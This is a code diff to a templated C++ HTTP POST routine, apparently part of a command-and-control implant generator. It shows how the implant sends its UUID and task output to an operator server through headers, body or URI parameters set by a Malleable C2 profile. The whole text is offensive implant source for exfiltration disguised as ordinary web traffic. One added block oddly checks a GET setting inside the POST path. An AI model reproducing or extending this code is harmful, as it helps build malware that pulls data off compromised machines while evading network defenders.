@@ -167,11 +167,6 @@ int post(std::string implant_uuid, std::string output_data, std::string task_uui
     std::wstring uri = L"[[ http_post_uri ]]";
     std::string final_post_body = ""; 
 
-    // --- Add addtl headers/params as specified in mc2 ---
-    [%- for header_or_param in http_post_client_headers_or_parameters_list %]
-    [[ render_add_headers_or_parameters(header_or_param) ]]
-    [%- endfor %]
-    // --- end ---
 
     // --- Malleable C2 ID/Output transport method ---
 
@@ -196,14 +191,6 @@ int post(std::string implant_uuid, std::string output_data, std::string task_uui
 
     [%- endif %]
     
-    [# I don't think this is a valid case for malleablec2, id can't go in body iirc #]
-    [# Can easily change with this if not the case. #]
-    [%- if http_post_client_id_terminator == "print" %]
-
-        // Rare: ID is appended to body. Usually prepended to final_post_body
-        final_post_body += implant_uuid; 
-
-    [%- endif %]
 
     //Need to check if ID is allowed in URI
 
@@ -211,24 +198,44 @@ int post(std::string implant_uuid, std::string output_data, std::string task_uui
     [# no %- here, as otherwise the previous comment adds the below headers line in #]
     [% if http_post_client_output_terminator == "header" %]
 
-        headers.push_back(L"[[ http_post_client_output_terminator_value ]]: " + w_payload);
+    headers.push_back(L"[[ http_post_client_output_terminator_value ]]: " + w_payload);
 
     [%- endif %]
 
     [% if http_post_client_output_terminator == "print" %]
 
-        final_post_body += w_payload;
+    //convert back to string for HTTP_POST function
+    final_post_body.assign(w_payload.begin(), w_payload.end());
 
     [%- endif %]
 
     [% if http_post_client_output_terminator == "parameter" %]
 
-        // This is dangerous for large output, but Malleable C2 allows it
-        std::wstring w_body_param(w_payload.begin(), w_payload.end());
-        if (uri.find(L"?") != std::wstring::npos) uri += L"&"; else uri += L"?";
-        uri += L"[[ http_post_client_output_terminator_value ]]=" + w_body_param;
-        
+    // This is dangerous for large output, but Malleable C2 allows it
+    std::wstring w_body_param(w_payload.begin(), w_payload.end());
+    if (uri.find(L"?") != std::wstring::npos) uri += L"&"; else uri += L"?";
+    uri += L"[[ http_post_client_output_terminator_value ]]=" + w_body_param;
+
     [%- endif %]
+
+    [# HTTP_GET: METADATA: URI - IF MC2 says it wants a header for where to find the metadata... #]
+    [%- if http_get_client_metadata_terminator == "uri-append" %]
+
+    //TODO: check if `/` at last char, if not, add one.
+    if (!uri.empty() && uri.back() != '/') {
+        uri.push_back('/');
+    }
+    //could use append from transform here too
+    uri += w_payload;
+
+    [% endif %]
+
+
+    // --- Add addtl headers/params as specified in mc2 b4 sending off ---
+    [%- for header_or_param in http_post_client_headers_or_parameters_list %]
+    [[ render_add_headers_or_parameters(header_or_param) ]]
+    [%- endfor %]
+    // --- end ---
 
     // --- End Malleable C2 ID/Output transport method ---
 
